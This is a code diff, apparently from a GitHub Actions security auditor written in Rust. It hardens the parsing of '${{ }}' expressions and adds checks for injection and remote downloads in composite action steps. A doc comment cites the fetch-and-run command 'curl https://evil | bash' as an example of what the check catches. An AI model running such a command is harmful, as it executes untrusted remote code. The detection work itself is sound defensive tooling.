@@ -122,19 +122,155 @@ yaml_key!(key_on, "on");
 
 // ─── Shared expression finder ────────────────────────────────────────────────
 
-pub(super) fn find_expressions(s: &str) -> Vec<&str> {
+pub(super) fn find_expressions(text: &str) -> Vec<&str> {
+    let bytes = text.as_bytes();
     let mut exprs = Vec::new();
-    let mut start = 0;
-    while let Some(begin) = s[start..].find("${{") {
-        let abs = start + begin + 3;
-        if let Some(end) = s[abs..].find("}}") {
-            exprs.push(&s[abs..abs + end]);
-            start = abs + end + 2;
-        } else {
-            break;
+    let mut cursor = 0;
+    while let Some(rel) = text[cursor..].find("${{") {
+        let abs = cursor + rel + 3;
+        // Find the closing `}}`, skipping any `}}` that appears inside a quoted
+        // string literal — otherwise `${{ '}}' == github.event.issue.title }}`
+        // truncates at the literal and the real context is never scanned.
+        let mut pos = abs;
+        let mut quote: Option<u8> = None;
+        let mut close: Option<usize> = None;
+        while pos < bytes.len() {
+            let byte = bytes[pos];
+            match quote {
+                Some(open) => {
+                    if byte == open {
+                        quote = None;
+                    }
+                }
+                None => {
+                    if byte == b'\'' || byte == b'"' {
+                        quote = Some(byte);
+                    } else if byte == b'}' && pos + 1 < bytes.len() && bytes[pos + 1] == b'}' {
+                        close = Some(pos);
+                        break;
+                    }
+                }
+            }
+            pos += 1;
+        }
+        match close {
+            Some(end) => {
+                exprs.push(&text[abs..end]);
+                cursor = end + 2;
+            }
+            None => break,
         }
     }
     exprs
+}
+
+/// Normalize a GitHub Actions expression body so a single dotted-substring test
+/// catches every equivalent spelling. Lowercases (contexts are
+/// case-insensitive), rewrites index access `['x']` / `["x"]` into dotted `.x`,
+/// and strips whitespace — so `github['event']['issue']['title']`,
+/// `github.event.issue['title']`, and `github.event.issue.TITLE` all normalize
+/// to `github.event.issue.title`.
+pub(super) fn normalize_expr(expr: &str) -> String {
+    let mut out = String::with_capacity(expr.len());
+    for ch in expr.chars() {
+        match ch {
+            '[' => out.push('.'),
+            ']' | '\'' | '"' => {}
+            c if c.is_whitespace() => {}
+            c => out.push(c.to_ascii_lowercase()),
+        }
+    }
+    out
+}
+
+/// True when a `uses:` value references `actions/checkout` (the repo owner/name
+/// are case-insensitive on GitHub) at a component boundary, so `Actions/Checkout`
+/// matches but `actions/checkout-helper` does not.
+pub(super) fn is_checkout_action(uses: &str) -> bool {
+    let lower = uses.to_ascii_lowercase();
+    let Some(rest) = lower.strip_prefix("actions/checkout") else {
+        return false;
+    };
+    rest.is_empty() || rest.starts_with('@') || rest.starts_with('/')
+}
+
+/// Audit the `runs.steps` of LOCAL composite actions (`action.yml`). Those
+/// steps execute in the caller's context but are NOT `jobs`, so the
+/// workflow-shaped checks in [`run`] never see them — a composite action with
+/// `run: curl https://evil | bash` or a `${{ github.event.* }}` injection would
+/// otherwise go completely unaudited. We run the run-block checks (script
+/// injection, external-artifact downloads) over each composite step.
+pub(crate) fn run_composite(
+    docs: &[(PathBuf, Yaml)],
+    checks: &crate::policy::CheckConfig,
+) -> Vec<AuditFinding> {
+    let mut findings = Vec::new();
+    if checks.expression_injection.is_off() && checks.external_artifacts.is_off() {
+        return findings;
+    }
+    for (file, doc) in docs {
+        let Some(steps) = doc
+            .as_hash()
+            .and_then(|m| m.get(&Yaml::String("runs".to_string())))
+            .and_then(Yaml::as_hash)
+            .and_then(|r| r.get(key_steps()))
+            .and_then(Yaml::as_vec)
+        else {
+            continue;
+        };
+        for step in steps {
+            let Some(step_map) = step.as_hash() else {
+                continue;
+            };
+            let step_name = step_map
+                .get(key_name())
+                .and_then(Yaml::as_str)
+                .unwrap_or("<unnamed step>");
+
+            if let Some(run) = step_map.get(key_run()).and_then(Yaml::as_str) {
+                if !checks.expression_injection.is_off() {
+                    injection::check_script_injection(
+                        file,
+                        step_name,
+                        run,
+                        Severity::Critical,
+                        &mut findings,
+                        checks.expression_injection,
+                    );
+                }
+                if !checks.external_artifacts.is_off() {
+                    // A composite action runs with the caller's token; treat it
+                    // as privileged (conservative) and PR-reachable-agnostic.
+                    external_artifacts::check_run_block(
+                        file,
+                        run,
+                        false,
+                        true,
+                        &mut findings,
+                        checks.external_artifacts.is_warn(),
+                    );
+                }
+            }
+
+            if !checks.expression_injection.is_off()
+                && let Some(with_map) = step_map.get(key_with()).and_then(Yaml::as_hash)
+            {
+                for (_key, val) in with_map {
+                    if let Some(val_str) = val.as_str() {
+                        injection::check_script_injection(
+                            file,
+                            step_name,
+                            val_str,
+                            Severity::High,
+                            &mut findings,
+                            checks.expression_injection,
+                        );
+                    }
+                }
+            }
+        }
+    }
+    findings
 }
 
 // ─── Run dispatcher ──────────────────────────────────────────────────────────
